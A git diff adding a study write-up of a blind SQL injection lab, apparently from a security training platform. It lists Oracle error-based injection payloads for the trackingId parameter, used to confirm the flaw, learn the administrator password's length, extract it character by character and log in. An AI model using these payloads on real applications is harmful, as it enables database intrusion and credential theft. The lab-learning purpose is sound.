@@ -337,20 +337,66 @@
 
 
 
+---
+
+<img width="566" height="778" alt="image" src="https://github.com/user-attachments/assets/f283f9e8-5c15-417f-a1fe-bcdf4d6931ed" />
+
+//LAB: Blind SQL injection with conditional errors
+
+
+- as always first try injecting with `'` into different params -- and get 500 error in trackingId param
+- then try adding `-- -` and also another `'` -- both work -- we get 200OK again
+- then try error-based payloads -- try different syntax
+- eventually oracle seems to work -- note that we need `||` to concatenate commands
+- we get 200OK with this payload `'+||(select+null+from+dual)||'`
+
+
+<img width="1254" height="302" alt="image" src="https://github.com/user-attachments/assets/da30bd2d-facd-45a7-8fc8-dc49e436fff2" />
+
+
+- confirm again with this payload `'+||(select+case+when+(1=2)+then+to_char(1/0)+else+null+end+from+dual)||'`
+
+<img width="1253" height="311" alt="image" src="https://github.com/user-attachments/assets/c2cbadb0-f460-4260-a9ad-3fa58ecfb4cc" />
+
+- now change to `(1=1)` and we get 500 error
+
+<img width="1250" height="309" alt="image" src="https://github.com/user-attachments/assets/954a6a3a-eb53-47c5-856c-be2de8a4ea50" />
 
 
 
+- 500 error means true
+- payload `'+||(select+case+when+length(password)>1+then+to_char(1/0)+else+null+end+from+users+where+username='administrator')||'`
+- so this means length of password is more than 1 -- since we got 500 error
+
+<img width="1247" height="329" alt="image" src="https://github.com/user-attachments/assets/d5559420-9831-411c-8205-6201297eb4fd" />
+
+
+- here we can see there's 20 characters in the password
+
+<img width="1251" height="325" alt="image" src="https://github.com/user-attachments/assets/3fb05068-0804-4cb2-9bb1-98131e59ffdd" />
+
+
+- now a new payload to brute each char -- apparently the first char is not 'a'
+<img width="1253" height="341" alt="image" src="https://github.com/user-attachments/assets/4b327573-d02b-41b7-b2f9-b7effeb0e7cd" />
 
 
 
+- send to intruder to brute each char
+- 500 error code means `true` == a match
+- payload -- `'+||(select+case+when+substr(password,1,1)='a'+then+to_char(1/0)+else+null+end+from+users+where+username='administrator')||'`
+- keep changing second value `substr(password,<1>, 1)` for next characters in the password
+
+<img width="1548" height="398" alt="image" src="https://github.com/user-attachments/assets/e6ecd3bc-f8c8-449f-b957-2d0ba43bb9a9" />
 
 
+- eventually we get -- `2nr6et37x5s8jqrwn5mm`
+- log in with `administrator : 2nr6et37x5s8jqrwn5mm`
+- and finally lab solved
+
+<img width="887" height="347" alt="image" src="https://github.com/user-attachments/assets/c08a18c6-fe6b-4c2c-b4fd-ccff35adb793" />
 
 
-
-
-
-
+---
 
 
 
